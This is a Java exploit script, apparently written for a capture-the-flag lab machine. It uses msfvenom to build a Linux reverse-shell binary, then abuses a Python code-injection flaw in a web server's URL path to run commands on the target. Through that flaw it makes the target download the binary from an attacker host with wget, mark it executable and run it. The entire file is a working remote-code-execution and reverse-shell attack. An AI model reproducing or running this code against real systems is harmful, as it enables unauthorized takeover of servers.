package COM.spti.spti;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;

import threads.CommandThread;

public class App {

	public static void main(String[] args) {
		
		String LHOST = args[0];
		String LPORT = args[1];

		try {

			Runtime.getRuntime().exec(
					"msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " -f elf -o kk.elf");
			
			System.out.println("lhoooost "+ LHOST);
			System.out.println("LPORTTTT "+ LPORT);
			System.out.println("HICE MALWARE");
			
			//CommandThread servidorPython = new CommandThread("python -m SimpleHTTPServer 80");
			//servidorPython.start();
			
			String cmd = "wget http://10.10.16.50/kk.elf -O /tmp/test.elf";
			get(cmd);
			
			System.out.println("DESCARGUE");
			
			Runtime.getRuntime().exec("rm kk.elf");
			
			System.out.println("REMOVI");
			
			
			String cmd1 = "chmod +x /tmp/test.elf";
			get(cmd1);
			
			//CommandThread escuchar = new CommandThread("nc -nlvp "+ LPORT);
			//escuchar.start();
						
			String cmd2 = "/tmp/test.elf";
			get(cmd2);
			
			
			

		} catch (MalformedURLException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} catch (ProtocolException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	public static void get(String cmd) {
		
		
		
		HttpURLConnection con;
		try {
			URL url = new URL("http://10.10.10.168:8080/';path='/';os.system(" + "'" + cmd + "'" + ");" + "'");
			con = (HttpURLConnection) url.openConnection();
			con.setRequestMethod("GET");
			con.getInputStream();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	
		
	}
}
